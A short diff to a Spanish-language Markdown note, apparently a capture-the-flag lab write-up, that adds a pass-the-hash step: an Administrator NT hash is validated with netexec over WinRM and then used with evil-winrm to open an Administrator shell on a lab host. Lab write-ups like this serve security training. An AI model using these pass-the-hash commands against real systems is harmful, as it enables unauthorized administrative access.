@@ -229,4 +229,9 @@ Con el hash `NT` obtenido anteriormente se lo pasaremos a [[NETEXEC]] para poder
 nxc winrm 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
 
-Como es valido
+Como es valido, podemos acceder usando [[EVIL-WINRM]]
+```shell
+evil-winrm -i 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
+```
+
+Obteniendo una shell como `Administrator`
